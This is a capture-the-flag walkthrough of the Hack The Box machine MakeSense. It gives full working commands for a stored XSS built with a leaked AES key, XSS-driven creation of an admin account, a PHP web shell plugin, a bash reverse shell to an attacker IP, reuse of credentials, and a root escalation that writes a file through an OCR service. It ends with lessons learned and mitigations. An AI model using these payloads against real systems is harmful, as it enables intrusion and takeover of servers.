---
title: "HTB Walkthrough: MakeSense"
date: 2026-07-06
draft: false
description: "Full walkthrough of the MakeSense machine from Hack The Box. Medium difficulty, Linux. Stored XSS on a custom WordPress theme via hardcoded AES-256-GCM client-side key → CSRF via XSS to create an admin user → malicious plugin upload (RCE as www-data) → credential reuse in wp-config.php → SSH as walter → arbitrary PHP file write via local OCR service running as root → RCE as root."
tags: ["HackTheBox", "Linux", "Medium", "WordPress", "XSS", "StoredXSS", "CSRF", "AES", "HardcodedKey", "OCR", "FileWrite", "RCE", "PrivilegeEscalation", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **MakeSense** on Hack The Box. **Medium** difficulty machine running **Linux**. Port 443 serves a **WordPress 7.0** site with a custom theme (`webagency`) that exposes a **hardcoded AES-256-GCM key in its client-side JavaScript**. This allows crafting an arbitrary XSS payload, encrypting it locally, and sending it directly to the backend — which decrypts and stores it unsanitised, producing a **Stored XSS**. When the bot/admin visits the panel, the injected JavaScript extracts the CSRF nonce from `user-new.php` and creates a new user with the `administrator` role. With admin access, a **malicious plugin** with a PHP backdoor is uploaded for a shell as `www-data`. Database credentials in `wp-config.php` are reused for the system account: SSH as `walter`. Finally, a local **OCR service** (port 8001) run by a **cron job as root** saves recognised text to a user-controlled filename with no extension validation — allowing an arbitrary `.php` file write and **RCE as root**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                                                                                             |
|----------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | MakeSense                                                                                                                                                                                          |
| **OS**         | Linux (Ubuntu 24.04.4 LTS)                                                                                                                                                                         |
| **Difficulty** | Medium                                                                                                                                                                                             |
| **IP**         | 10.129.26.162                                                                                                                                                                                      |
| **Techniques** | Hardcoded AES key bypass · Stored XSS via custom AJAX · CSRF via XSS (admin creation) · Malicious WordPress plugin · wp-config.php credential reuse · OCR file write → root RCE                   |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.26.162
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
```

### 1.2 Web Enumeration — WordPress with WPScan

```bash
echo "10.129.26.162 makesense.htb" >> /etc/hosts
wpscan --url https://10.129.26.162/ --disable-tls-checks -e u,ap,at,tt,cb,dbe
```

```
[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).

[+] webagency
| Location: https://10.129.26.162/wp-content/themes/webagency/
| [!] Directory listing is enabled
| Style Name: WebAgency
| Description: Modern web development agency theme with Tailwind CSS...
| Version: 1.0 (80% confidence)

[+] XML-RPC seems to be enabled: https://10.129.26.162/xmlrpc.php
[+] Upload directory has listing enabled: https://10.129.26.162/wp-content/uploads/

[+] Users: admin, walter, jake
```

> **💡 Attack surface:** two services — SSH and HTTPS with WordPress. The `webagency` theme is a **custom in-house development** (not an official theme), making it the most promising attack vector. Directory listing on `/wp-content/themes/webagency/` allows directly examining its static resources (JS/CSS).

---

## 2. Custom Theme `webagency` Analysis

Inspecting the theme's JavaScript files reveals several AJAX actions registered in `admin-ajax.php`:

```
submit_contact_form
save_voice_raw
save_voice_results
```

A **hardcoded encryption key** appears inside the same client-side JavaScript:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The code encrypts data in the browser (AES-256-GCM) before sending it to the backend via `save_voice_results` (`post_id` + `encrypted_payload`). A function `applySymbolMapping(text)` attempts to sanitise symbols — but it only runs inside the legitimate "voice → transcription → encrypt" flow.

> **⚠️ Vulnerable design:** the sanitisation function (`applySymbolMapping`) runs on the client and only executes in the legitimate flow before encryption. Because the key is hardcoded and public, an attacker can encrypt any arbitrary payload locally **without passing through that sanitisation**, send it directly to `save_voice_results`, and have the backend decrypt and store it as-is — completely breaking the security model.

---

## 3. Exploitation — Stored XSS via Encrypted Payload Bypass

### 3.1 Nonce Extraction

```bash
NONCE=$(curl -ks https://10.129.26.162/ | grep -oP '"nonce":"\K[^"]+')
echo $NONCE
```

```
f3142630f4
```

### 3.2 Create a Contact to Obtain a Valid `post_id`

```bash
curl -ks -X POST "https://10.129.26.162/wp-admin/admin-ajax.php" \
  -H "Referer: https://10.129.26.162/" \
  -d "action=submit_contact_form" \
  -d "nonce=$NONCE" \
  -d "name=test" \
  -d "email=test@test.com" \
  -d "phone=123456" \
  -d "message=hello this is a test message long enough to trigger processing"
```

```json
{"success":true,"data":{"message":"Thank you for contacting us! We will get back to you soon.","post_id":69}}
```

### 3.3 Build the AES-256-GCM Encrypted XSS Payload

```bash
PAYLOAD=$(node -e "
const crypto = require('crypto');
const key    = crypto.createHash('sha256').update('bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest();
const iv     = crypto.randomBytes(12);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
const p      = JSON.stringify({
  transcription: '<img src=x onerror=alert(document.domain)>',
  summary:       '<img src=x onerror=alert(document.domain)>'
});
const enc = Buffer.concat([cipher.update(p,'utf8'), cipher.final()]);
const tag = cipher.getAuthTag();
process.stdout.write(Buffer.concat([iv, enc, tag]).toString('base64'));
")
```

### 3.4 Inject the Encrypted Payload via save_voice_results

```bash
curl -ks -X POST "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_results" \
  -F "nonce=f3142630f4" \
  -F "post_id=69" \
  -F "encrypted_payload=$PAYLOAD"
```

```json
{"success":true,"data":{"message":"Results saved successfully!","post_id":69}}
```

### 3.5 Confirm Stored XSS with Callback

```bash
export IP=10.10.14.211
python3 -m http.server 8000 &

POST_ID=71

PAYLOAD=$(node -e "
const crypto = require('crypto');
const key    = crypto.createHash('sha256').update('bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest();
const iv     = crypto.randomBytes(12);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
const ip     = process.env.IP;
const x      = '<img src=x onerror=\"this.onerror=null;this.src=\\x27http://'+ip+':8000/ping\\x27\">';
const p      = JSON.stringify({transcription: x, summary: x});
const enc    = Buffer.concat([cipher.update(p,'utf8'), cipher.final()]);
const tag    = cipher.getAuthTag();
process.stdout.write(Buffer.concat([iv, enc, tag]).toString('base64'));
")

curl -ks -X POST "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_results" \
  -F "nonce=f3142630f4" \
  -F "post_id=$POST_ID" \
  -F "encrypted_payload=$PAYLOAD"
```

```
10.129.26.162 - - [06/Jul/2026 20:11:30] "GET /ping HTTP/1.1" 404 -
```

```
Normal flow:    voice → transcription → applySymbolMapping → AES-GCM encrypt → save_voice_results → server decrypts + sanitises → stores
Malicious flow: attacker encrypts own payload with public key → save_voice_results → server decrypts without sanitising
                → <img onerror=...> stored → admin visits panel → XSS fires in admin session
```

> **💡 Key finding:** the callback confirms that a user with an admin session executed the injected JavaScript. The `404` response code is irrelevant — only the inbound request from the victim's authenticated context matters.

---

## 4. CSRF via XSS — Administrator Account Creation

With the Stored XSS confirmed, the admin's authenticated session is used to **create a new administrator account** by dynamically extracting the CSRF nonce from the DOM itself.

```bash
PAYLOAD=$(node -e '
const crypto = require("crypto");
const key    = crypto.createHash("sha256").update("bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI").digest();
const iv     = crypto.randomBytes(12);
const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
const ip     = process.env.IP;

const js = `
fetch("/wp-admin/user-new.php", {credentials:"include"})
.then(r => r.text())
.then(t => {
  const d = new DOMParser().parseFromString(t, "text/html");
  const n = d.querySelector("input[name=_wpnonce_create-user]")?.value;
  if (!n) { throw new Error("nonce_not_found"); }
  const f = new FormData();
  f.append("action",               "createuser");
  f.append("_wpnonce_create-user", n);
  f.append("_wp_http_referer",     "/wp-admin/user-new.php");
  f.append("user_login",           "codexadmin");
  f.append("email",                "codexadmin@test.htb");
  f.append("first_name",           "codex");
  f.append("last_name",            "admin");
  f.append("pass1",                "Password123!@#");
  f.append("pass2",                "Password123!@#");
  f.append("role",                 "administrator");
  f.append("createuser",           "Add New User");
  return fetch("/wp-admin/user-new.php", {method:"POST", credentials:"include", body:f});
})
.then(r  => { new Image().src = "http://${ip}:8000/done?status=" + r.status; })
.catch(e => { new Image().src = "http://${ip}:8000/err?e=" + encodeURIComponent(e.message); });
`;

const x   = `<img src=x onerror="${js.replaceAll("\"","&quot;")}">`;
const p   = JSON.stringify({transcription: x, summary: x});
const enc = Buffer.concat([cipher.update(p, "utf8"), cipher.final()]);
const tag = cipher.getAuthTag();
process.stdout.write(Buffer.concat([iv, enc, tag]).toString("base64"));
')

curl -ks -X POST "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_results" \
  -F "nonce=$NONCE" \
  -F "post_id=$POST_ID" \
  -F "encrypted_payload=$PAYLOAD"
```

```
10.129.26.162 - - [06/Jul/2026 20:14:33] "GET /done?status=200 HTTP/1.1" 404 -
```

> **🔑 Credentials obtained:** `codexadmin : Password123!@#` with role `administrator`. The `status=200` callback confirms successful account creation.

---

## 5. RCE as `www-data` — Malicious WordPress Plugin

With administrator access confirmed at `https://makesense.htb/wp-login.php`, plugin installation is used for code execution.

### 5.1 Create and Upload the Malicious Plugin

```bash
mkdir shellplugin
cat > shellplugin/shellplugin.php <<'PHP'
<?php
/*
Plugin Name: Shell Plugin
*/
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
PHP
zip -r shellplugin.zip shellplugin
```

**Upload:** `Plugins → Add New → Upload Plugin → shellplugin.zip → Activate`

### 5.2 RCE Verification and Reverse Shell

```bash
curl -ks "https://makesense.htb/wp-content/plugins/shellplugin/shellplugin.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
nc -lvnp 4444
```

```bash
curl -ks "https://makesense.htb/wp-content/plugins/shellplugin/shellplugin.php?cmd=bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.211/4444+0>%261'"
```

```
Connection received on 10.129.26.162 49302
www-data@makesense:/var/www/html/wp-content/plugins/shellplugin$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

```
Normal flow:    admin installs plugin from wordpress.org (reviewed code) → legitimate functionality
Malicious flow: admin access via CSRF/XSS → upload plugin with PHP backdoor → GET ?cmd=id → RCE as www-data
```

---

## 6. Lateral Movement — Credential Reuse in `wp-config.php`

```bash
grep DB_ /var/www/html/wp-config.php
```

```
define( 'DB_USER',     'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

> **💡 Key finding:** the database credentials (`walter` / `JbhHDAEgXvri3!`) are **reused** as the system account credentials for the `walter` user.

```bash
ssh walter@makesense.htb
```

```
walter@makesense:~$
```

---

## 7. User Flag

```bash
cat /home/walter/user.txt
```

> 🔑 User flag obtained.

---

## 8. Privilege Enumeration — Local OCR Service

```bash
ss -tulpen | grep 8001
```

```
tcp   LISTEN 0  4096  127.0.0.1:8001  0.0.0.0:*  ino:11956 sk:8 cgroup:/system.slice/cron.service <->
```

> **⚠️ Critical exposure:** a service is listening only on `127.0.0.1:8001`, inside the `cron.service` cgroup — meaning it was launched by a **cron job running as root**.

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/ | grep -i title
```

```html
<title>MakeSense</title>
```

The service accepts the same `walter` credentials via HTTP Basic Auth and is an internal **OCR tool**: upload an image, extract its text, and save that text to a file inside `saved/`.

---

## 9. Privilege Escalation — Arbitrary PHP File Write via OCR Service (RCE as root)

The OCR service exposes two operations:

1. `POST /` with `canvas_image` (data URI): extracts text from the image via OCR, returns an `ocr_id`.
2. `POST /` with `ocr_id`, `filename`, and `save_output=Save`: writes the extracted text to `saved/<filename>` **with no validation of extension or content**.

> **⚠️ Design flaw:** the text the OCR "reads" is whatever appears in the image we supply — we fully control the **content**. Because `filename` is also unconstrained, we control the **extension** too. This allows writing a `.php` file with arbitrary code into the service's webroot. Requesting it via HTTP has the PHP interpreter execute it with the process's privileges — **root**.

### 9.1 Generate a PHP Payload Image

```python
from PIL import Image, ImageDraw, ImageFont
import base64

text      = "<?php system('chmod +s /bin/bash'); ?>"
font_path = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
font      = ImageFont.truetype(font_path, 64)

tmp = Image.new("RGB", (10, 10), "white")
bb  = ImageDraw.Draw(tmp).textbbox((0, 0), text, font=font)

img = Image.new("RGB", (bb[2]-bb[0]+80, bb[3]-bb[1]+80), "white")
ImageDraw.Draw(img).text((40-bb[0], 40-bb[1]), text, fill="black", font=font)
img.save("/tmp/mk_suid.png")

with open("/tmp/mk_suid.png", "rb") as f:
    b64 = base64.b64encode(f.read()).decode()
with open("/tmp/mk_du.txt", "w") as f:
    f.write("data:image/png;base64," + b64)
```

The image renders the string `<?php system('chmod +s /bin/bash'); ?>` in a large monospaced font so the OCR engine reads it accurately.

### 9.2 Submit the Image to the OCR Service

```bash
B=http://127.0.0.1:8001
A='walter:JbhHDAEgXvri3!'
J=/tmp/mk_cj

curl -s -u "$A" -c "$J" -b "$J" "$B/" \
  --data-urlencode 'canvas_image@/tmp/mk_du.txt' \
  -o /tmp/mk_o1

OCRID=$(grep -oP 'name="ocr_id" value="\K[^"]+' /tmp/mk_o1)
echo $OCRID
```

```
ocr_6a4bf97d330ef1.66612266
```

### 9.3 Save the OCR Result as `pwn.php`

```bash
curl -s -u "$A" -c "$J" -b "$J" "$B/" \
  --data-urlencode "ocr_id=$OCRID" \
  --data-urlencode 'filename=pwn.php' \
  --data-urlencode 'save_output=Save' \
  -o /tmp/mk_o2
```

### 9.4 Trigger the Payload

```bash
curl -s -u "$A" "$B/saved/pwn.php"
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

```bash
/bin/bash -p
bash-5.2# id
uid=1000(walter) gid=1000(walter) euid=0(root) egid=0(root) groups=0(root),1000(walter)
```

```
Normal flow:    image → OCR extracts text → save_output writes as .txt in saved/ → user reads text
Malicious flow: image containing PHP code → OCR "reads" the code → saved as pwn.php (no extension check)
                → GET /saved/pwn.php → PHP executes as root → chmod +s /bin/bash → /bin/bash -p → EUID 0
```

---

## 10. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 11. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap reveals SSH and HTTPS. WPScan identifies WordPress 7.0 with custom theme `webagency` and users `admin`, `walter`, `jake`.
2. **Theme analysis** → Client-side JavaScript exposes the hardcoded AES-256-GCM key `bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI` and the AJAX action `save_voice_results`.
3. **Stored XSS** → XSS payload is encrypted locally with the public key and sent to `save_voice_results`. The backend decrypts without sanitising and stores the raw HTML.
4. **CSRF via XSS** → Injected JavaScript dynamically extracts the nonce from `user-new.php` and creates `codexadmin` with role `administrator`.
5. **RCE as www-data** → Malicious plugin upload → PHP backdoor → reverse shell as `www-data`.
6. **Lateral movement** → `wp-config.php` exposes `walter:JbhHDAEgXvri3!`, reused as the OS account credentials → SSH as `walter`.
7. **User flag** → `/home/walter/user.txt`.
8. **OCR service** → Port 8001 locally, in root cron cgroup, writes files with user-controlled extension and no validation.
9. **Privilege escalation** → Image with PHP payload → OCR extracts the code → saved as `pwn.php` → PHP execution as root → `chmod +s /bin/bash` → `/bin/bash -p` → EUID 0.
10. **Root flag** → `/root/root.txt`.

**What I learned from this machine:**

- **A hardcoded encryption key in client-side JavaScript protects nothing.** The purpose of the "encryption" was to prevent the client-side sanitisation from being bypassed — but a key visible in the source code achieves exactly the opposite: any attacker can encrypt the payload of their choice, bypassing sanitisation without the server detecting it. Input sanitisation must always happen on the server, regardless of the transport mechanism.

- **A Stored XSS in the admin panel is total CSRF.** XSS allows executing JavaScript in the authenticated context of any user who visits the panel. WordPress's CSRF nonces protect against requests forged from other origins, but not against JavaScript already executing on the same origin. The root cause is always the XSS — once it is fixed, the nonce becomes an effective defence again.

- **WordPress plugin installation is code execution.** Any user with the `administrator` role can upload and activate a plugin containing arbitrary PHP. In environments where plugin installation is not regularly needed, `DISALLOW_FILE_MODS = true` in `wp-config.php` eliminates this vector entirely. Admin credentials must be protected as if they were SSH access to the server.

- **Database credentials in `wp-config.php` are server credentials if reused.** Walter's password appeared in a file readable by `www-data` — the application user. Once a shell as `www-data` was obtained, lateral movement to `walter` was trivial. Service credentials must be unique and never shared with operating system accounts.

- **A service that writes files with user-controlled extensions into a web root is equivalent to RCE.** The OCR service did not validate the output file extension. Regardless of the content coming from an OCR engine, an attacker who controls what appears in the image also controls the text that gets written. Writing files into directories served by an interpreter (PHP, Python WSGI, etc.) must enforce a strict allowlist of permitted extensions.

- **Local services with elevated privileges are the most common escalation surface.** The OCR service ran as root via cron. Being bound to `127.0.0.1` protected it from external access, but any user with a local shell could interact with it. The principle of least privilege requires the OCR service to run as a dedicated low-privilege user.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Hardcoded AES-256-GCM key in client-side JavaScript | Never delegate server-side sanitisation to a client-controlled encryption mechanism; validate and sanitise on the server regardless of transport |
| Stored XSS in `transcription` / `summary` | HTML-encode all user-generated content before rendering it in the admin panel; apply a strict Content-Security-Policy |
| CSRF via XSS (admin account creation) | Fixing the XSS is the root cause fix; add `SameSite=Strict` headers as defence-in-depth |
| Malicious plugin uploaded by administrator | Use `DISALLOW_FILE_MODS = true` in `wp-config.php`; restrict plugin installation to trusted sources |
| Credential reuse between DB and OS account (`wp-config.php`) | Use unique, randomly generated credentials for each service; rotate after any `wp-config.php` exposure |
| OCR service writes files with user-controlled extension into webroot | Enforce an extension allowlist (`.txt` only); never serve OCR-generated files from a PHP-enabled directory |
| OCR service runs as root via cron | Run under a dedicated unprivileged account; isolate with `systemd` hardening (`User=`, `NoNewPrivileges`, `ProtectSystem`) |
